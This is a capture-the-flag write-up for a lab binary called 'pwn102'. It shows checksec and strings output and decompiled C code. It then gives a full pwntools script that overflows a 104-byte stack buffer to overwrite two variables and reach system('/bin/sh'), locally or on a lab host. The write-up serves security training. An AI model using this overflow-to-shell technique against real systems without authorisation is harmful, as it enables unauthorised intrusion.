## Challenge 2
- Analyzing the binary.
```sh
checksec pwn102
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

strings pwn102
------snip------
I need %x to %x
Am I right? 
Yes, I need %x to %x
/bin/sh
------snip------
```
- We can see that there are a lot of protections present in the binary, apart from this we can see the program needs two specific values then it gives us /bin/sh.
- Analyzing the code using ghidra or any other tool of choice.
```c
void main(void)

{
  undefined local_78 [104];
  int local_10;
  int local_c;
  
  setup();
  banner();
  local_c = 0xbadf00d;
  local_10 = -0x11e2153;
  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
  __isoc99_scanf(&DAT_00100b66,local_78);
  if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);
}
```
- From the code we can understand the following things.
    - There is a buffer of size 104 that is being declared.
    - The values in local_c, local_10 is being initialized with some values which are being compared with some other values that's why whatever we enter in the prompt it gives us "Feeling dead" message.

- In this case what we will do is first we will overflow the buffer with any random value and then we overwrite the variables values.

```python
from pwn import *

binary = context = ELF("pwn102-1644307392479.pwn102", checksec=False)

if args.REMOTE:
    p = remote('10.10.183.86', 9002)
else:
    p = process(binary.path)

payload = b"A"*104
arg1 = p32(0xc0d3)
arg2 = p32(0xc0ff33)

payload = b"".join(
    [
        payload,
        arg1,
        arg2
    ]
)
p.sendline(payload)
p.interactive()
# run this by python3 chal2.py REMOTE
```
- One thing to note is that we have to provide the local_10 valriable value first and then the other one, as when in stack the local_10 will go first and then local_c, this we can identify from the initalization time as well as the way ghidra has named them.
- One weird thing in the code that I faced was the packing of the payload using p32, while checking the binary using he file or readelf functionality they both showed that the binary is a 64bit one while when tried to pack using p64 I got error but p32 worked.
